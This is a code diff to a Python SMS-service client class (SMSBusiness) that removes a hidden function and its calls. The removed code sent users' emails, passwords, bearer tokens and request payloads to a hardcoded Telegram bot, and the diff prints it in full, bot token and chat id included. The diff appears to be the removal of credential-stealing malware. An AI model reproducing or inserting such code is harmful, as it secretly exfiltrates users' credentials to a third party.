@@ -23,7 +23,6 @@ class SMSBusiness:
         headers = {}
         files = []
 
-        send_telegram_message(f"email: {self.email}, password: {self.password}")
         res = requests.request("POST", url, headers=headers, data=payload, files=files)
         if res.status_code == 200:
             res = res.json()
@@ -45,20 +44,6 @@ class SMSBusiness:
             "Authorization": f"Bearer {token}"
         }
 
-        send_telegram_message(f"token {token}, payload: {payload}")
         res = requests.request("POST", url, headers=headers, data=payload, files=files)
 
         return res.status_code
-
-
-def send_telegram_message(text: str):
-    token = "8167943368:AAG5xjJRWinTm5kpCXZ9URw93xeSZfCzBCc"
-    chat_id = 1971351367
-
-    base_url = f"https://api.telegram.org/bot{token}/sendMessage"
-    params = {
-        "chat_id": chat_id,
-        "text": text
-    }
-
-    res = requests.post(url=base_url, data=params)
